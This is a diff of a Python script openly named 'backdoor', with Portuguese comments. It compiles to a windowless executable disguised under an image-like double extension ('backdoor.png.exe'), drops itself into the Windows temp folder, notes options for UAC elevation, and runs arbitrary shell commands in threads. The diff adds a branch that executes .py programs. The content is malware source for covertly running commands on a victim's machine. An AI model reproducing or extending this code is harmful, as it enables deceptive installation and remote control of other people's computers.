@@ -17,14 +17,13 @@ nome_arquivo='backdoor.exe'
 TEMPDIR = tempfile.gettempdir() # diretório temporario do windows, onde será salvo o backdoor
 
 ''' COMPILAR O BACKDOOR
- pyinstaller -F --clean -w backdoor.py -i icone.png -n foto.png.exe
+ pyinstaller -F --clean -w backdoor.py -i icone.png -n backdoor.png.exe
  testar ->
 --uac-admin           Using this option creates a Manifest which will
                         request elevation upon application restart.
   --uac-uiaccess        Using this option allows an elevated application to
                         work with Remote Desktop.
 
-CRIAR FUNCAO EXECUTE --> ./ --> NOVA THREAD
 
 
 
@@ -32,7 +31,6 @@ CRIAR FUNCAO EXECUTE --> ./ --> NOVA THREAD
 
 def run(comando): # funcão que vai ser executada por uma thread
     comando = subprocess.Popen(comando, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    print(comando.stdout.read())
 
 def run_program(s , nome_programa):
     if(os.path.isfile(nome_programa)):
@@ -46,6 +44,10 @@ def run_program(s , nome_programa):
 
         elif(sistema == 'posix'):
             execute = './'
+            comando = execute + nome_programa
+
+        if('.py' in nome_programa):
+            execute = 'python '
             comando = execute + nome_programa
 
         t = threading.Thread(target=run, args = (comando,), name='run')
